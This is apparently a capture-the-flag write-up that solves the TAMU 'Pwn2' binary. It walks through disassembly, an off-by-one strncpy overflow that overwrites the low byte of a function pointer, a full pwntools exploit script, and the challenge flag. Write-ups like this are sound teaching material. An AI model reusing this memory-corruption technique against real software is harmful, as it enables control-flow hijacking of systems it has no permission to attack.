# Pwn2
Pwn, 356 points

## Description:

A binary file was attached, in addition to an address and port.

## Solution:

Let's run the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn2# ./pwn2
Which function would you like to call?
test
```

It's not very clear what this does, let's check the disassembly:

```
root@kali:/media/sf_CTFs/tamu/Pwn2# r2 pwn2
 -- Follow the white rabbit
[0x00000570]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00000570]> afl
0x00000000   53 1093 -> 1100 sym.imp.__cxa_finalize
0x0000049c    3 35           sym._init
0x000004d0    1 6            sym.imp.strcmp
0x000004e0    1 6            sym.imp.gets
0x000004f0    1 6            sym.imp._IO_getc
0x00000500    1 6            sym.imp.puts
0x00000510    1 6            sym.imp.__libc_start_main
0x00000520    1 6            sym.imp.setvbuf
0x00000530    1 6            sym.imp.fopen
0x00000540    1 6            sym.imp.putchar
0x00000550    1 6            sym.imp.strncpy
0x00000560    1 6            fcn.00000560
0x00000568    1 6            fcn.00000568
0x00000570    1 49           entry0
0x000005a2    1 4            fcn.000005a2
0x000005b0    1 4            sym.__x86.get_pc_thunk.bx
0x000005c0    4 58   -> 53   sym.deregister_tm_clones
0x00000600    4 71           sym.register_tm_clones
0x00000650    5 71           sym.__do_global_dtors_aux
0x000006a0    1 9            entry1.init
0x000006a9    1 4            sym.__x86.get_pc_thunk.dx
0x000006ad    1 43           sym.two
0x000006d8    4 124          sym.print_flag
0x00000754    1 43           sym.one
0x0000077f    3 93           sym.select_func
0x000007dc    1 115          sym.main
0x0000084f    1 4            sym.__x86.get_pc_thunk.ax
0x00000860    4 93           sym.__libc_csu_init
0x000008c0    1 2            sym.__libc_csu_fini
0x000008c4    1 20           sym._fini
[0x00000570]> s sym.main
[0x000007dc]> pds
;-- main:
;-- eip:
0x000007ee call sym.__x86.get_pc_thunk.bx
0x000007f9 "44\u0120\u0120\x04\x04\x03\u0154\u0154\u0154\x13\x13\x04\x01\x01"
0x00000805 "LF\x01\x01\x01"
0x00000808 call sym.imp.setvbuf
0x00000813 str.Which_function_would_you_like_to_call
0x0000081a call sym.imp.puts
0x00000829 call sym.imp.gets
0x00000838 call sym.select_func
0x00000864 call sym.__x86.get_pc_thunk.bx
0x00000872 "4 \t(\x1d\x1c\x06"
0x0000087c call sym._init
```

The program receives user input via `gets`, so we can overflow it. Where would we like to jump to? `print_flag` from the function list seems like a good choice. 

However, we have a problem - ASLR (PIE) is enabled and we can't easily hardcode `print_flag`'s address as the return address:
```console
root@kali:/media/sf_CTFs/tamu/Pwn2# checksec.sh -f ./pwn2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols      No      0               4       ./pwn2
```


Let's see what else we can find - `select_func` seems like the next place to look.

Here's the decompiled source of the function (using `ghidra`'s decompiler) to get a quick understanding of what it does:

```c
void select_func(char *func_name)
{
  int res;
  char lcl_func_name [30];
  undefined *func_ptr;
  
  strncpy(lcl_func_name,func_name,0x1f);
  res = strcmp(lcl_func_name,"one");
  func_ptr = two;
  if (res == 0) {
    func_ptr = one;
  }
  (*(code *)func_ptr)();
  return;
}
```

So this function takes the function name supplied by the user as input, compares it to "one" and if there is a match, calls `one()`. Otherwise, it calls `two()`.

However, the local buffer is 30 bytes long, and `strncpy` is called with `0x1f = 31`.

The `strncpy` documentation says:

> Copies the first num characters of source to destination. If the end of the source C string (which is signaled by a null-character) is found before num characters have been copied, destination is padded with zeros until a total of num characters have been written to it.

> No null-character is implicitly appended at the end of destination if source is longer than num. Thus, in this case, destination shall not be considered a null terminated C string (reading it as such would overflow).

If we provide 31 characters as a function name, our source will be one byte longer than the destination and no NULL byte will be appended. Therefore, we have an off-by-one bug. And of course, the input is received via `gets`, so we can provide a 31-byte-long string.

What will we be able to override?

```assembly
/ (fcn) sym.select_func 93
|   sym.select_func (char *func_name);
|           ; var char *lcl_func_name @ ebp-0x2a
|           ; var int func_ptr @ ebp-0xc
|           ; var int local_4h @ ebp-0x4
|           ; arg char *func_name @ ebp+0x8
|           ; CALL XREF from sym.main (0x838)
|           0x0000077f      55             push ebp
|           0x00000780      89e5           mov ebp, esp
|           0x00000782      53             push ebx
|           0x00000783      83ec34         sub esp, 0x34
|           0x00000786      e825feffff     call sym.__x86.get_pc_thunk.bx
|           0x0000078b      81c32d180000   add ebx, 0x182d
|           0x00000791      8d83f5e6ffff   lea eax, [ebx - 0x190b]
|           0x00000797      8945f4         mov dword [func_ptr], eax
|           0x0000079a      83ec04         sub esp, 4
|           0x0000079d      6a1f           push 0x1f                   ; size_t  n
|           0x0000079f      ff7508         push dword [func_name]      ; const char *src
|           0x000007a2      8d45d6         lea eax, [lcl_func_name]
|           0x000007a5      50             push eax                    ; char *dest
|           0x000007a6      e8a5fdffff     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
|           0x000007ab      83c410         add esp, 0x10
|           0x000007ae      83ec08         sub esp, 8
|           0x000007b1      8d838be9ffff   lea eax, [ebx - 0x1675]
|           0x000007b7      50             push eax                    ; const char *s2
|           0x000007b8      8d45d6         lea eax, [lcl_func_name]
|           0x000007bb      50             push eax                    ; const char *s1
|           0x000007bc      e80ffdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x000007c1      83c410         add esp, 0x10
|           0x000007c4      85c0           test eax, eax
|       ,=< 0x000007c6      7509           jne 0x7d1
|       |   0x000007c8      8d839ce7ffff   lea eax, [ebx - 0x1864]
|       |   0x000007ce      8945f4         mov dword [func_ptr], eax
|       |   ; CODE XREF from sym.select_func (0x7c6)
|       `-> 0x000007d1      8b45f4         mov eax, dword [func_ptr]
|           0x000007d4      ffd0           call eax
|           0x000007d6      90             nop
|           0x000007d7      8b5dfc         mov ebx, dword [local_4h]
|           0x000007da      c9             leave
\           0x000007db      c3             ret
```

By overflowing `lcl_func_name` we can override the LSB of `func_ptr` which is directly under it in the stack. However, if we take a look at the decompiled C code, it won't matter since `func_ptr` is set after the `strncpy`:

```c
  strncpy(lcl_func_name,func_name,0x1f);
  res = strcmp(lcl_func_name,"one");
  func_ptr = two;
```

Going back to the assembly, though, we see that this isn't really the case (another reminder that decompilation is helpful but can't be relied on). `func_ptr` gets its default value here:

```assembly
0x00000791      8d83f5e6ffff   lea eax, [ebx - 0x190b] ; two()
0x00000797      8945f4         mov dword [func_ptr], eax
```

And only a few lines later, `strncpy` is called:

```assembly
0x000007a6      e8a5fdffff     call sym.imp.strncpy        ; char 
```

The last thing to decide is what we override `func_ptr` with.

```
0x000006ad    1 43           sym.two
0x000006d8    4 124          sym.print_flag
```

Since `two` and `print_flag` are defined very close to each other, and the only difference between them is luckily the LSB, we can use this to perform the flow hijacking and jump to `print_flag` instead of `two`.

The following script performs the exploit:

```python
import os
from pwn import *

LOCAL_PATH = "./pwn2"
REMOTE_PATH = ("pwn.tamuctf.com", 4322)

def get_process(is_remote):
    if is_remote:
        p = remote(*REMOTE_PATH)
    else:
        p = process(LOCAL_PATH)
    
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Which function would you like to call?", payload)


e = ELF(LOCAL_PATH)
overflow_offset = 0x2a - 0xc #lcl_func_name - func_ptr
log.info("overflow offset: {}".format(overflow_offset))
print_flag_addr = e.symbols["print_flag"]
log.info("print_flag() address: {}".format(hex(print_flag_addr)))
payload = fit({overflow_offset: p8(print_flag_addr & 0xFF)}, filler = 'A')
p = get_process(args.REMOTE)
log.info("Sending payload: {}".format(enhex(payload)))
send_payload(p, payload)
print p.recvall()
```

The output:
```console
root@kali:/media/sf_CTFs/tamu/Pwn2# python exploit.py REMOTE
[*] '/media/sf_CTFs/tamu/Pwn2/pwn2'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] overflow offset: 30
[*] print_flag() address: 0x6d8
[+] Opening connection to pwn.tamuctf.com on port 4322: Done
[*] Sending payload: 616161616261616163616161646161616561616166616161676161616861d8
[+] Receiving all data: Done (71B)
[*] Closed connection to pwn.tamuctf.com port 4322

This function is still under development.
gigem{4ll_17_74k35_15_0n3}
```